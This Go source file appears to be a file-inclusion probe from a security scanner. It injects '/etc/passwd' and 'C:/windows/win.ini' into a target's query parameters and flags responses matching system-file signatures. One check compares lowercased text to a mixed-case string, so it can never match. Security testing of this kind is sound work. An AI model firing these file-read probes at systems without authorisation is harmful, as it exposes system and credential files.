package fileIncloud

import (
	"net/http"
	"net/url"
	"prismx_cli/core"
	"prismx_cli/core/models"
	"prismx_cli/core/owaspTop10/utils"
	"prismx_cli/utils/netUtils"
	"strconv"
	"strings"
	"time"
)

func Start(id string, target *url.URL, timeout time.Duration) {

	for _, item := range []string{"/etc/passwd", "C:/windows/win.ini"} {
		for _, subItem := range utils.ParseQuery(target, item) {
			go func(uri string) {
				request, err := http.NewRequest("GET", uri, nil)
				if err != nil {
					return
				}
				sendHttp, err := netUtils.SendHttp(request, timeout, false)
				if err != nil || sendHttp.Other.StatusCode == 404 {
					return
				}
				body := strings.ToLower(string(sendHttp.Body))
				if strings.Contains(body, "warning: fopen(") ||
					strings.Contains(body, "operation not permitted") ||
					strings.Contains(body, "root:x:0:") ||
					strings.Contains(body, "permission denied") ||
					strings.Contains(body, "[extensions]") ||
					strings.Contains(body, "file not found") ||
					strings.Contains(body, "FileNotFoundException") {
					port, _ := strconv.Atoi(target.Port())
					core.CaptureVul(id, target.Hostname(), port, models.MSG{
						Name:     "Any File Read",
						Type:     "File Include",
						Payload:  sendHttp.RequestRaw,
						Target:   target.Scheme + "://" + target.Host,
						Response: sendHttp.Header + string(sendHttp.Body),
						Describe: "Some websites may require the ability to view and download files. If there are no restrictions or restrictions bypassed on the files that users can view or download, they can view or download any file. These files can be source code files, configuration files, sensitive files, and so on.",
						Leve:     3,
						EXP:      false,
					})
					return
				}
			}(subItem)
		}
	}
}
